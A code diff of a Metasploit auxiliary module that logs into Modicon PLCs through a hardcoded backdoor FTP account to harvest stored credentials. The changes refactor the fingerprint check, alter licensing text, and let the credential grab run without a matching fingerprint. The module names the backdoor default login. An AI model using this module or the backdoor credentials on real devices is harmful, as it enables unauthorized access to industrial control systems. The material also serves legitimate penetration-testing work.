@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -38,7 +36,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(21),
         OptString.new('FTPUSER', [true, "The backdoor account to use for login", 'ftpuser']),
-        OptString.new('FTPPASS', [true, "The backdoor password to use for login", 'password']),
+        OptString.new('FTPPASS', [true, "The backdoor password to use for login", 'password'])
       ], self.class)
 
     register_advanced_options(
@@ -61,7 +59,6 @@ class Metasploit3 < Msf::Auxiliary
   # device, then we're going to end up storing HTTP credentials that are not
   # correct. If there's a way to fingerprint the device, it should be done here.
   def check
-    return true unless datastore['RUN_CHECK']
     is_modicon = false
     vprint_status "#{ip}:#{rport} - FTP - Checking fingerprint"
     connect rescue nil
@@ -70,22 +67,26 @@ class Metasploit3 < Msf::Auxiliary
       is_modicon = check_banner()
       disconnect
     else
-      print_error "#{ip}:#{rport} - FTP - Cannot connect, skipping"
-      return false
+      vprint_error "#{ip}:#{rport} - FTP - Cannot connect, skipping"
+      return Exploit::CheckCode::Unknown
     end
+
     if is_modicon
-      print_status "#{ip}:#{rport} - FTP - Matches Modicon fingerprint"
+      vprint_status "#{ip}:#{rport} - FTP - Matches Modicon fingerprint"
+      return Exploit::CheckCode::Detected
     else
-      print_error "#{ip}:#{rport} - FTP - Skipping due to fingerprint mismatch"
+      vprint_error "#{ip}:#{rport} - FTP - Skipping due to fingerprint mismatch"
     end
-    return is_modicon
+
+    return Exploit::CheckCode::Safe
   end
 
   def run
-    if check()
-      if setup_ftp_connection()
-        grab()
-      end
+    if datastore['RUN_CHECK'] and check == Exploit::CheckCode::Detected
+      print_status("Service detected.")
+      grab() if setup_ftp_connection()
+    else
+      grab() if setup_ftp_connection()
     end
   end
 
